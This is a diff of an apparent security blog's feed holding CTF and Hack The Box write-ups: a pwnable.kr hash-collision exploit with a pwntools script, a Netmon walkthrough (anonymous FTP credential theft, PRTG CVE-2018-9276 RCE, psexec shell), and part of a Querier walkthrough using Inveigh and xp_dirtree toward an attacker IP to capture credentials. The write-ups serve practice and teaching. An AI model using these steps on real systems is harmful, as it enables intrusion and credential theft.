+&lt;h4 id=&quot;we-can-use-113626824-as-the-first-4-pieces-to-get-the-last-piece-we-will-multiply-113626824-by-4-and-subtract-the-result-from-568134124-&quot;&gt;We can use 113626824 as the first 4 pieces, to get the last piece we will multiply 113626824 by 4 and subtract the result from 568134124 :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; 113626824 * 4
+454507296
+&amp;gt;&amp;gt;&amp;gt; 568134124 - 454507296
+113626828
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;whats-left-is-to-convert-them-to-hex-&quot;&gt;What’s left is to convert them to hex :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hex(113626824)
+'0x6c5cec8'
+&amp;gt;&amp;gt;&amp;gt; hex(113626828)
+'0x6c5cecc'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;and-because-its-little-endian-we-will-reverse-the-order-final-payload-will-be-&quot;&gt;And because it’s little endian we will reverse the order, final payload will be :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'print &quot;\xc8\xce\xc5\x06&quot; * 4 + &quot;\xcc\xce\xc5\x06&quot;'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;lets-test-it-&quot;&gt;Let’s test it :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/pwnable.kr/collision/test# ./test `python -c 'print &quot;\xc8\xce\xc5\x06&quot; * 4 + &quot;\xcc\xce\xc5\x06&quot;'`                                                                 
+ip : 1329747125
+
+--------------------------
+loop :  0
+piece value : 113626824
+
+--------------------------
+loop :  1
+piece value : 113626824
+
+--------------------------
+loop :  2
+piece value : 113626824
+
+--------------------------
+loop :  3
+piece value : 113626824
+
+--------------------------
+loop :  4
+piece value : 113626828
+
+/bin/cat: flag: No such file or directory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;it-works&quot;&gt;It works.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/pwn/collision/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-by-the-way-what-we-did-now-is-a-hash-collision-we-made-a-hash-function-produce-the-same-output-for-different-inputs&quot;&gt;And by the way what we did now is a &lt;a href=&quot;https://learncryptography.com/hash-functions/hash-collision-attack&quot;&gt;hash collision&lt;/a&gt;, we made a hash function produce the same output for different inputs.&lt;/h4&gt;
+&lt;h4 id=&quot;i-also-wrote-small-python-script-using-pwntools-&quot;&gt;I also wrote small python script using &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c5cec8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c5cecc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'col'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pwnable.kr'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'guest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2222&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./col'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'col'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Flag: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/pwn/collision/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;pwned-&quot;&gt;pwned !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-other-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;other write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;h4 id=&quot;previous-pwn-write-up--pwnablekr---bof&quot;&gt;Previous pwn write-up : &lt;a href=&quot;/pwn/bof/&quot;&gt;pwnable.kr - bof&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Binary Exploitation" /><category term="code analysis" /><category term="Exploit Development" /><category term="c" /><category term="Python" /><summary type="html">Introduction Hey guys this is my write-up for a challenge called collision from pwnable.kr. It’s a very simple challenge, we need a password to make the program read the flag, the function that validates the given password is vulnerable to hash collision so we will exploit it. Challenge Description : ``` Daddy told me about cool MD5 hash collision today. I wanna do something like that too!</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/pwn/collision/0.png" /></entry><entry><title type="html">Hack The Box - Unattended</title><link href="http://localhost:4000/hack-the-box/unattended/" rel="alternate" type="text/html" title="Hack The Box - Unattended" /><published>2019-08-24T00:00:00+02:00</published><updated>2019-08-24T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/unattended</id><content type="html" xml:base="http://localhost:4000/hack-the-box/unattended/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-unattended-retired-and-heres-my-write-up-about-it-personally-i-think-this-box-should-have-been-rated-as-hard-not-medium-it-really-had-a-lot-of-stuff-that-were-hard-to-find-and-exploit-there-was-an-interesting-sql-injection-vulnerability-that-could-be-escalated-to-local-file-inclusion-then-to-remote-code-execution-and-thats-my-favorite-part-about-this-box-its-a-linux-box-and-its-ip-is-101010126-i-added-it-to-etchosts-as-unattendedhtb-lets-jump-right-in-&quot;&gt;Hey guys today Unattended retired and here’s my write-up about it. Personally I think this box should have been rated as hard not medium, it really had a lot of stuff that were hard to find and exploit. There was an interesting &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injection vulnerability that could be escalated to local file inclusion then to remote code execution and that’s my favorite part about this box. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.126&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;unattended.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -6042,113 +6479,4 @@ ftp&amp;gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---querier&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---hackback&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/hackback/&quot;&gt;Hack The Box - Hackback&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="ftp" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as netmon.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC netmon.htb We got ftp on port 21, http on port 80 and smb. The most interesting thing is that anonymous login is allowed on ftp and obviously it’s running on C: ! FTP, User Flag I checked that ftp server and got the user flag for Public : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM &amp;lt;DIR&amp;gt; inetpub 07-16-16 09:18AM &amp;lt;DIR&amp;gt; PerfLogs 02-25-19 10:56PM &amp;lt;DIR&amp;gt; Program Files 02-03-19 12:28AM &amp;lt;DIR&amp;gt; Program Files (x86) 02-03-19 08:08AM &amp;lt;DIR&amp;gt; Users 02-25-19 11:49PM &amp;lt;DIR&amp;gt; Windows 226 Transfer complete. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd Public 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Downloads 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Music 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Pictures 06-28-19 06:49AM 82 tester.txt 02-03-19 12:35AM 33 user.txt 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Videos 226 Transfer complete. ftp&amp;gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0.07 secs (0.4790 kB/s) ftp&amp;gt; We owned user. PRTG Credentials I checked the http service and found a web application called PRTG Network Monitor. However we need credentials to access the application. We have access to C: through the ftp server so we can search for credentials there. I searched for the place where PRTG configuration files are saved and found it was in C:\Users\All Users\Application Data\Paessler\PRTG Network Monitor so I went there and downloaded the configuration files : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 07-16-16 09:28AM &amp;lt;DIR&amp;gt; All Users 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Default 07-16-16 09:28AM &amp;lt;DIR&amp;gt; Default User 07-16-16 09:16AM 174 desktop.ini 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd &quot;All Users&quot; 250 CWD command successful. ftp&amp;gt; ls -al 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Application Data 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Desktop 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 02-03-19 12:15AM &amp;lt;DIR&amp;gt; Licenses 11-20-16 10:36PM &amp;lt;DIR&amp;gt; Microsoft 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Paessler 02-03-19 08:05AM &amp;lt;DIR&amp;gt; regid.1991-06.com.microsoft 07-16-16 09:18AM &amp;lt;DIR&amp;gt; SoftwareDistribution 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Start Menu 02-03-19 12:15AM &amp;lt;DIR&amp;gt; TEMP 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Templates 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOPrivate 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOShared 02-25-19 10:56PM &amp;lt;DIR&amp;gt; VMware 226 Transfer complete. ftp&amp;gt; cd &quot;Application Data/Paessler/PRTG Network Monitor&quot; 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Configuration Auto-Backups 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Log Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Debug) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Sensors) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (System) 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Logs (Web Server) 02-25-19 08:01PM &amp;lt;DIR&amp;gt; Monitoring Database 06-28-19 06:54AM 1287578 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 06-28-19 06:25AM 1647701 PRTG Graph Data Cache.dat 02-25-19 11:00PM &amp;lt;DIR&amp;gt; Report PDFs 02-03-19 12:18AM &amp;lt;DIR&amp;gt; System Information Database 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Ticket Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; ToDo Database 226 Transfer complete. ftp&amp;gt; get &quot;PRTG Configuration.dat&quot; local: PRTG Configuration.dat remote: PRTG Configuration.dat 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1287578 bytes received in 3.43 secs (366.5319 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old&quot; local: PRTG Configuration.old remote: PRTG Configuration.old 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1189697 bytes received in 3.05 secs (380.7779 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old.bak&quot; local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1153755 bytes received in 3.04 secs (370.2494 kB/s) ftp&amp;gt; Knowing that the default admin user for PRTG is prtgadmin I searched for that string in the 3 configuration files : cat * | grep -A 20 -B 20 &quot;prtgadmin&quot; I got the password which was PrTg@dmin2018 : However it didn’t work, after some attempts I changed it to PrTg@dmin2019 and it worked : RCE, Root Flag After searching for authenticated exploits I found CVE-2018-9276 which was an authenticated RCE vulnerability. I used this exploit which exploits the RCE and creates a new Administrator user (This works because PRTG runs as system) : New user credentials : pentest:P3nT3st!. I used psexec.py from impacket to get a shell : psexec.py pentest:'P3nT3st!'@netmon.htb And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Querier Next Hack The Box write-up : Hack The Box - Hackback</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/netmon/0.png" /></entry><entry><title type="html">Hack The Box - Querier (Commando)</title><link href="http://localhost:4000/hack-the-box/querier-2/" rel="alternate" type="text/html" title="Hack The Box - Querier (Commando)" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier-2</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier-2/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys-this-is-the-second-post-for-querier-you-can-read-the-first-post-here-in-the-first-post-i-solved-it-with-kali-in-this-post-i-will-solve-it-with-commando-vm-queriers-ip-is-101010125-i-added-it-to-cwindowssystem32driversetchosts-as-querierhtb-lets-jump-right-in-&quot;&gt;Hey guys this is the second post for Querier, you can read the first post &lt;a href=&quot;/hack-the-box/querier&quot;&gt;here&lt;/a&gt;. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-we-dont-have-credentials-for-mssql-so-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. We don’t have credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; so let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
-&lt;h4 id=&quot;we-need-to-list-the-shares-we-can-do-that-using-net-view-&quot;&gt;We need to list the shares, We can do that using &lt;code class=&quot;highlighter-rouge&quot;&gt;net view&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net view querier.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-only-showed-us-reports-because-its-the-only-share-that-we-can-access-anonymously-which-is-nice&quot;&gt;It only showed us &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt; because it’s the only share that we can access anonymously which is nice.&lt;/h4&gt;
-&lt;h4 id=&quot;we-can-mount-the-share-from-cmd-with-net-use-&quot;&gt;We can mount the share from &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;net use&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net use Z: \\querier.htb\Reports /persistent:yes&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/3.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-can-also-do-it-from-the-file-explorer-&quot;&gt;We can also do it from the file explorer :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/5.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
-&lt;h4 id=&quot;i-used-olevba-to-get-credentials-from-the-excel-file-like-i-did-in-the-first-post-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; to get credentials from the excel file like I did in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;to-connect-to-the-mssql-server-i-will-use-heidisql-&quot;&gt;To connect to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server I will use &lt;a href=&quot;https://www.heidisql.com/&quot;&gt;HeidiSQL&lt;/a&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;however-authentication-failed-&quot;&gt;However, authentication failed :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-tried-windows-authentication-&quot;&gt;I tried windows authentication :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;but-it-also-failed-because-it-was-trying-as-guest-not-reporting-&quot;&gt;But it also failed because it was trying as guest not reporting :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;to-solve-this-we-can-use-runas-to-run-heidi-as-reporting-&quot;&gt;To solve this we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; as reporting :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\reporting cmd.exe&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;from-the-new-cmd-session-i-ran-heidi-&quot;&gt;From the new &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; session I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-windows-authentication-worked-&quot;&gt;Now windows authentication worked :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;got-permission-denied-for-xp_cmdshell-&quot;&gt;Got permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-can-run-a-fake-smb-server-to-capture-credentials-using-a-tool-called-inveigh-which-works-like-responder-from-powershell-i-imported-inveigh-import-module-ctoolsinveighinveighps1-then-i-disabled-the-firewall-netsh-advfirewall-set-allprofiles-state-off-and-invoked-inveigh-invoke-inveigh--ip-1010xxxx--consoleoutput-y&quot;&gt;We can run a fake &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; server to capture credentials using a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; which works like responder. From &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell&lt;/code&gt; I imported &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Import-Module C:\Tools\Inveigh\Inveigh.ps1&lt;/code&gt;). Then I disabled the firewall (&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh advfirewall set allprofiles state off&lt;/code&gt;) and invoked &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y&lt;/code&gt;).&lt;/h4&gt;
-&lt;h4 id=&quot;from-heidi-i-used-xp_dirtree-&quot;&gt;From &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; I used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/querier-2/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
